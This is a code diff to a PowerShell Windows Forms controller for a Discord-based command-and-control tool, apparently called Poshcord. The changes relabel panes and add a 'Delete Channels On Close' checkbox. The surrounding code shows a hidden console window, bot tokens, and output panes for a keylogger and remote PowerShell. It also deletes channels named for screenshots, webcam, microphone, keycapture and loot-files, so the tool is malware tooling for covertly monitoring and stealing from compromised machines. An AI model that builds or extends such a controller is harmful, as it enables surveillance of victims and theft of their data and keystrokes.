@@ -27,7 +27,6 @@ $token = "$tk1" # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
 $token2 = "$tk2" # BOT TO SEND MESSAGES AS USER
 
 # ============================ SCRIPT SETUP =============================
-$deleteonclose = 1 #Delete channels on closing session
 $hidewindow = 1 #Hide the console window
 
 If ($HideWindow -gt 0){
@@ -97,7 +96,7 @@ $imageBytes = $client.DownloadData($imageUrl)
 $ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
 
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "Poshcord C2 Control"
+$form.Text = "C2 Control"
 $form.Width = 1255
 $form.Height = 950
 $form.BackColor = "#242424"
@@ -227,6 +226,22 @@ $folderButton.Height = 30
 $folderButton.BackColor = "#eeeeee"
 $form.Controls.Add($folderButton)
 
+$boxtext = New-Object System.Windows.Forms.Label
+$boxtext.Text = "Delete Channels On Close"
+$boxtext.ForeColor = "#bcbcbc"
+$boxtext.AutoSize = $true
+$boxtext.Width = 25
+$boxtext.Height = 10
+$boxtext.Location = New-Object System.Drawing.Point(1060, 833)
+$boxtext.Font = 'Microsoft Sans Serif,8,style=Bold'
+$form.Controls.Add($boxtext)
+
+$delbox = New-Object System.Windows.Forms.CheckBox
+$delbox.Width = 20
+$delbox.Height = 20
+$delbox.Location = New-Object System.Drawing.Point(1040, 830)
+$form.Controls.Add($delbox)
+
 $OutputBoxHeader = New-Object System.Windows.Forms.Label
 $OutputBoxHeader.Text = "Powershell Output"
 $OutputBoxHeader.AutoSize = $true
@@ -248,7 +263,7 @@ $OutputBox.BackColor = "#d3d3d3"
 $form.Controls.Add($OutputBox)
 
 $OutputBoxHeader2 = New-Object System.Windows.Forms.Label
-$OutputBoxHeader2.Text = "Keylogger"
+$OutputBoxHeader2.Text = "Keylogger Output"
 $OutputBoxHeader2.AutoSize = $true
 $OutputBoxHeader2.ForeColor = "#eeeeee"
 $OutputBoxHeader2.Width = 25
@@ -268,7 +283,7 @@ $OutputBox2.BackColor = "#d3d3d3"
 $form.Controls.Add($OutputBox2)
 
 $OutputBoxHeader3 = New-Object System.Windows.Forms.Label
-$OutputBoxHeader3.Text = "Session"
+$OutputBoxHeader3.Text = "Session Control Output"
 $OutputBoxHeader3.AutoSize = $true
 $OutputBoxHeader3.ForeColor = "#eeeeee"
 $OutputBoxHeader3.Width = 25
@@ -594,7 +609,7 @@ $button2.Add_Click({
         Add-OutputBoxLine -Outfeed "CLOSING SESSION" -OutputBoxName "OutputBox3" -ForeColor "Red"
         sendMsg -Message 'close' -id $ID3
         sleep 5
-        If ($deleteonclose -gt 0){
+        if($delbox.Checked){
             $channelNamesToDelete = @("powershell", "screenshots", "webcam", "session-control", "loot-files", "keycapture", "microphone")
             DeleteChannels -channelNames $channelNamesToDelete
         }
